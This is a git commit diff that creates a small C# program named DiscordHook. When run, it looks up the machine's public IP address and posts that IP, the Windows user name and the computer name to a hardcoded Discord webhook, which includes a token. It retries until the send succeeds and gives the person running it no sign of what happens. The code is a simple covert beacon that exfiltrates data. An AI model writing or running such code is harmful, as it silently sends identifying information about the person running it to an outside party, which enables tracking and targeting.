86d01a753f25a78f92abde78ab8b909c2a040776
sorrow01 <aabderraziq@gmail.com>
2021-06-17 00:37:03 +0100

    Init

--- DiscordHook/Alerts.cs
+++ DiscordHook/Alerts.cs
@@ -1,7 +1,46 @@
+using System;
+using System.Collections.Generic;
+using System.Net.Http;
+using System.Threading.Tasks;
+
 namespace DiscordHook
 {
-    public class Alerts
+    public abstract class Alerts
     {
-        
+        public static async Task<string> GetIpAsync()
+        {
+            while (true)
+            {
+                try
+                {
+                    return await new HttpClient().GetStringAsync("https://api.ipify.org");
+                }
+                catch 
+                {
+                    await Task.Delay(500);
+                }
+            }
+        }
+
+        public static async Task SendHookAlertAsync(string ip, string dshook)
+        {
+            while (true)
+            {
+                try
+                {
+                    await new HttpClient().PostAsync(dshook, new FormUrlEncodedContent(new Dictionary<string, string>{
+                        {"content", $"```IP: {ip}\nSession name: {System.Security.Principal.WindowsIdentity.GetCurrent().Name}\n" +
+                                    $"Computer name: {Environment.MachineName}```"},
+                        {"username", System.Security.Principal.WindowsIdentity.GetCurrent().Name},
+                        {"avatar_url", "https://cdn.discordapp.com/attachments/785419281135042564/854132950098903050/d225266ddff6e8d7dc387d671704308c.png"}
+                    }));
+                    break;
+                }
+                catch
+                {
+                    await Task.Delay(500);
+                }
+            }
+        }
     }
 }
--- DiscordHook/Program.cs
+++ DiscordHook/Program.cs
@@ -1,9 +1,16 @@
-﻿namespace DiscordHook
+﻿using System.Threading.Tasks;
+using static DiscordHook.Alerts;
+
+namespace DiscordHook
 {
-    internal class Program
+    internal static class Program
     {
-        public static void Main(string[] args)
+        private static async Task Main(string[] args)
         {
+            const string dshook = "https://discord.com/api/webhooks/849806948882055228/5STEFuPPtwaRVlfp-8hj_ynX44cgal7mYcOCaN9_bwjVBz-LdXLtKrNz4PtvOeyiuR9t";
+
+            await SendHookAlertAsync(await GetIpAsync(), dshook);
+
         }
     }
 }
